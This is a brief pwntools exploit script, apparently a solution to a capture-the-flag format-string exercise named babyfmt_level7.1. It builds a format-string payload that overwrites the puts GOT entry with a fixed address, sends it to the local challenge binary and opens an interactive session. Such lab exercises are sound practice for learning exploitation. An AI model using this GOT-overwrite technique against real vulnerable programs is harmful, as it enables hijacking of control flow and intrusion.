from pwn import *

context.arch = 'amd64'
BINARY="/challenge/babyfmt_level7.1"

elf = ELF(BINARY)

payload = fmtstr_payload(42, {elf.got['puts']: 0x401351})
print(payload)

# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug(BINARY, gdbscript="source /opt/gef/gef.py")
p = process(BINARY)
p.send(payload)
p.send(b"END")
p.interactive()